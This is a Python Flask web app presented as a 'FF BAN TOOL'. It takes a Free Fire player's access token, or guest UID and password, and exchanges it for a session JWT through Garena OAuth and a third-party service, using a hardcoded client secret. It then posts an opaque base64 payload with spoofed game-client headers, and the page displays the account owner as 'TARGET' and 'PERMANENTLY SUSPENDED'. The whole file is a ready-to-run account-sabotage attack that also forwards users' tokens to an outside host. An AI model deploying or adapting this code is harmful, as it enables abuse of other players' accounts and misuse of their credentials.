from flask import Flask, request, jsonify, render_template_string
import requests
import base64
import json
import time
import jwt
from urllib.parse import quote

app = Flask(__name__)

API_URL_1 = 'https://api.freefireservice.dnc.su/oauth/account:login?data={}'
API_URL_2 = 'https://client.ind.freefiremobile.com/GetLoginData'

BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>VAIBHAV FF BAN TOOL v2.2 - CLEAN</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            background: radial-gradient(ellipse at center, #0f0f23 0%, #000000 70%);
            background-attachment: fixed;
            color:#fff;
            font-family:'Roboto', sans-serif;
            min-height:100vh;
            padding:20px;
            overflow-x:hidden;
        }
        .container{
            max-width:550px;margin:0 auto;
            background: rgba(10,10,25,0.98);
            backdrop-filter: blur(20px);
            border-radius:25px;
            padding:40px;
            box-shadow: 0 25px 80px rgba(0,255,136,0.15);
            border:1px solid rgba(0,255,136,0.2);
        }
        .header{
            text-align:center;margin-bottom:35px;padding-bottom:25px;
            border-bottom:2px solid rgba(0,255,136,0.3);
        }
        .title{
            font-family:'Orbitron', monospace;font-size:32px;font-weight:900;
            background: linear-gradient(135deg, #00ff88 0%, #00cc66 50%, #00ff88 100%);
            -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
            text-shadow: 0 0 30px rgba(0,255,136,0.5);margin-bottom:10px;
        }
        .subtitle{color:rgba(255,255,255,0.7);font-size:14px;font-weight:300;letter-spacing:2px;text-transform:uppercase;}
        
        .mode-tabs{display:flex;background:rgba(30,30,60,0.8);backdrop-filter:blur(10px);border-radius:20px;padding:8px;margin-bottom:30px;box-shadow:0 10px 40px rgba(0,0,0,0.5);border:1px solid rgba(0,255,136,0.2);}
        .tab{flex:1;padding:18px 10px;text-align:center;border-radius:15px;cursor:pointer;font-weight:600;font-size:15px;transition:all 0.4s;}
        .tab.active{background:linear-gradient(135deg,#00ff88,#00cc66);color:#000;box-shadow:0 10px 30px rgba(0,255,136,0.4);transform:translateY(-2px);}
        .tab:not(.active):hover{background:rgba(255,255,255,0.1);transform:translateY(-1px);}
        
        .tab-content{display:none;padding:30px 25px;background:rgba(25,25,50,0.6);backdrop-filter:blur(15px);border-radius:20px;margin-bottom:25px;box-shadow:inset 0 5px 25px rgba(0,0,0,0.4);border:1px solid rgba(0,255,136,0.15);transition:all 0.4s;}
        .tab-content.active{display:block;}
        
        .input-group{margin-bottom:25px;}
        label{display:block;margin-bottom:10px;color:rgba(255,255,255,0.9);font-size:15px;font-weight:500;padding-left:30px;position:relative;}
        label::before{content:'✦';position:absolute;left:0;color:#00ff88;font-weight:bold;}
        input{width:100%;padding:18px 20px;border:2px solid rgba(0,255,136,0.3);border-radius:15px;background:rgba(35,35,65,0.8);color:#fff;font-size:16px;font-weight:500;transition:all 0.4s;box-shadow:inset 0 2px 10px rgba(0,0,0,0.3);}
        input::placeholder{color:rgba(255,255,255,0.5);}
        input:focus{outline:none;border-color:#00ff88;box-shadow:0 0 0 4px rgba(0,255,136,0.2),0 10px 30px rgba(0,255,136,0.15);transform:translateY(-2px);}
        
        .btn{width:100%;padding:22px;background:linear-gradient(135deg,#ff4757,#ff3838);color:white;border:none;border-radius:20px;font-size:20px;font-weight:700;font-family:'Orbitron',monospace;cursor:pointer;transition:all 0.4s;box-shadow:0 15px 40px rgba(255,71,87,0.4);text-transform:uppercase;letter-spacing:1px;}
        .btn:hover{transform:translateY(-4px) scale(1.02);box-shadow:0 20px 50px rgba(255,71,87,0.5);}
        .btn:disabled{background:#555;transform:none;box-shadow:none;cursor:not-allowed;}
        
        .result{margin-top:30px;padding:35px;border-radius:25px;min-height:150px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;font-size:18px;font-weight:600;}
        .success{background:linear-gradient(135deg,rgba(0,255,120,0.2),rgba(0,200,80,0.15));border:3px solid #00ff88;box-shadow:0 20px 60px rgba(0,255,136,0.4);}
        .error{background:linear-gradient(135deg,rgba(255,80,80,0.2),rgba(255,50,50,0.15));border:3px solid #ff4757;box-shadow:0 20px 60px rgba(255,71,87,0.3);}
        .loading{background:linear-gradient(135deg,rgba(255,200,0,0.2),rgba(255,180,0,0.15));border:3px solid #ffd700;box-shadow:0 20px 60px rgba(255,215,0,0.3);}
        
        .account-info{background:rgba(0,150,255,0.15);border:2px solid rgba(0,150,255,0.5);padding:25px;border-radius:20px;margin-top:25px;font-family:'Orbitron',monospace;font-size:15px;width:100%;box-shadow:0 10px 30px rgba(0,150,255,0.2);}
        .account-info strong{color:#00ff88;font-weight:700;}
        .status{margin-top:20px;padding:15px 25px;background:rgba(0,255,136,0.15);border-radius:15px;font-size:16px;font-weight:700;color:#00ff88;text-transform:uppercase;letter-spacing:1px;box-shadow:0 5px 20px rgba(0,255,136,0.2);}
        .spinner{display:inline-block;width:28px;height:28px;border:4px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#00ff88;animation:spin 1s ease-in-out infinite;margin-right:12px;}
        @keyframes spin{to{transform:rotate(360deg);}}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="title">VAIBHAV FF BAN TOOL</div>
            <div class="subtitle">v2.2 - CLEAN & WORKING</div>
        </div>
        
        <div class="mode-tabs">
            <div class="tab active" onclick="switchMode('token')">🔑 Access Token</div>
            <div class="tab" onclick="switchMode('guest')">👤 Guest UID/Pass</div>
        </div>
        
        <div id="token-content" class="tab-content active">
            <div class="input-group">
                <label>Access Token</label>
                <input type="text" id="accessToken" placeholder="Enter your access token here...">
            </div>
        </div>
        
        <div id="guest-content" class="tab-content">
            <div class="input-group">
                <label>Guest UID</label>
                <input type="text" id="guestUid" placeholder="Enter UID (e.g: nah)" value="nah">
            </div>
            <div class="input-group">
                <label>Guest Password</label>
                <input type="password" id="guestPass" placeholder="Enter Password (e.g: lol)" value="lol">
            </div>
        </div>
        
        <button class="btn" onclick="banAccount()">
            <span id="btn-text">🚀 EXECUTE BAN</span>
            <span id="btn-spinner" class="spinner" style="display:none;"></span>
        </button>
        
        <div id="result" style="display:none;"></div>
    </div>

    <script>
        let currentMode = 'token';
        
        function switchMode(mode) {
            currentMode = mode;
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(mode + '-content').classList.add('active');
        }
        
        async function banAccount() {
            const btn = event.target;
            const btnText = document.getElementById('btn-text');
            const btnSpinner = document.getElementById('btn-spinner');
            const result = document.getElementById('result');
            
            btn.disabled = true;
            btnText.style.display = 'none';
            btnSpinner.style.display = 'inline-block';
            result.style.display = 'flex';
            
            result.innerHTML = '<div class="result loading"><span class="spinner"></span><strong>🔐 Authenticating...</strong></div>';
            
            try {
                let payload;
                if (currentMode === 'guest') {
                    payload = {
                        mode: 'guest',
                        uid: document.getElementById('guestUid').value.trim(),
                        password: document.getElementById('guestPass').value.trim()
                    };
                } else {
                    payload = {
                        mode: 'token',
                        access_token: document.getElementById('accessToken').value.trim()
                    };
                }
                
                const response = await fetch('/api/ban', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                
                const data = await response.json();
                result.innerHTML = data.debug ? 
                    `<div class="result ${data.success ? 'success' : 'error'}">
                        <div style="font-size:24px;font-weight:900;">${data.success ? '🎉' : '⚠️'} ${data.message}</div>
                        ${data.account_info ? `
                            <div class="account-info">
                                <strong>🎯 TARGET:</strong><br><br>
                                👤 ${data.account_info.nickname}<br>
                                🆔 ${data.account_info.account_id}<br>
                                🌍 ${data.account_info.region}<br>
                                📱 ${data.account_info.version}
                            </div>
                        ` : ''}
                        <div class="status">${data.status || 'PERMANENTLY SUSPENDED'}</div>
                    </div>` : 
                    `<div class="result ${data.success ? 'success' : 'error'}"><div style="font-size:24px;">${data.success ? '🎉' : '⚠️'} ${data.message}</div></div>`;
                
            } catch (error) {
                result.innerHTML = `<div class="result error"><div style="font-size:24px;">🌐 Network Error: ${error.message}</div></div>`;
            }
            
            setTimeout(() => {
                btn.disabled = false;
                btnText.style.display = 'inline-block';
                btnSpinner.style.display = 'none';
                btnText.textContent = '🚀 EXECUTE BAN';
            }, 3000);
        }
    </script>
</body>
</html>
'''

def decode_jwt(token):
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return {}
        payload_part = parts[1]
        missing_padding = len(payload_part) % 4
        if missing_padding:
            payload_part += '=' * (4 - missing_padding)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        decoded_str = decoded_bytes.decode('utf-8')
        return json.loads(decoded_str)
    except:
        return {}

def guest_login(uid, password):
    oauth_url = "https://100067.connect.garena.com/oauth/guest/token/grant"
    headers = {
        "User-Agent": "GarenaMSDK/5.0.2P4(SM-A515F;Android 11;en-US;USA;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Connection": "Keep-Alive"
    }
    data = {
        "uid": uid.strip(),
        "password": password.strip(),
        "response_type": "token",
        "client_type": "2",
        "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
        "client_id": "100067"
    }
    resp = requests.post(oauth_url, headers=headers, data=data, timeout=20, verify=True)
    if resp.status_code == 200:
        result = resp.json()
        token = result.get("access_token")
        if token:
            return token
    return None

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/ban', methods=['POST'])
def ban_account():
    try:
        data = request.get_json()
        
        jwt_token = None
        access_token = None
        user_data = {}
        
        if data.get('mode') == 'guest':
            uid = data.get('uid', '').strip()
            password = data.get('password', '').strip()
            if not uid or not password:
                return jsonify({'success': False, 'message': 'UID and Password required'})
            access_token = guest_login(uid, password)
            if not access_token:
                return jsonify({'success': False, 'message': 'Guest login failed'})
        else:
            access_token = data.get('access_token', '').strip()
            if not access_token:
                return jsonify({'success': False, 'message': 'Access token required'})
        
        encoded_token = quote(access_token, safe='')
        url_1 = API_URL_1.format(encoded_token)
        response1 = requests.get(url_1, timeout=25)
        
        if response1.status_code != 200:
            return jsonify({'success': False, 'message': f'API Connection Failed! Status: {response1.status_code}'})
        
        resp_json = response1.json()
        if '8' not in resp_json:
            return jsonify({'success': False, 'message': 'Invalid/Expired Token'})
        
        jwt_token = resp_json['8']
        user_data = decode_jwt(jwt_token)
        
        nickname = user_data.get('nickname', 'Unknown')
        region = user_data.get('lock_region') or user_data.get('region', 'IND')
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', '2018.4.11f1')
        
        time.sleep(2.5)
        headers = {
            'Authorization': f'Bearer {jwt_token}',
            'X-Unity-Version': '2018.4.11f1',
            'X-GA': 'v1 1',
            'ReleaseVersion': version,
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; SM-G975F Build/QP1A.190711.020)',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'Keep-Alive',
            'Content-Length': str(len(BODY_BASE64))
        }
        
        body_data = base64.b64decode(BODY_BASE64)
        ban_resp = requests.post(API_URL_2, headers=headers, data=body_data, timeout=30)
        
        if ban_resp.status_code == 200:
            return jsonify({
                'success': True,
                'message': f'BAN SUCCESSFUL! {nickname} has been suspended',
                'account_info': {
                    'nickname': nickname,
                    'account_id': account_id,
                    'region': region,
                    'version': version
                },
                'status': 'PERMANENTLY SUSPENDED ✅',
                'debug': True
            })
        else:
            return jsonify({'success': False, 'message': f'BAN FAILED - Status: {ban_resp.status_code}'})
            
    except requests.exceptions.Timeout:
        return jsonify({'success': False, 'message': 'Request Timeout'})
    except requests.exceptions.ConnectionError:
        return jsonify({'success': False, 'message': 'Connection Error'})
    except:
        return jsonify({'success': False, 'message': 'Unexpected Error'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)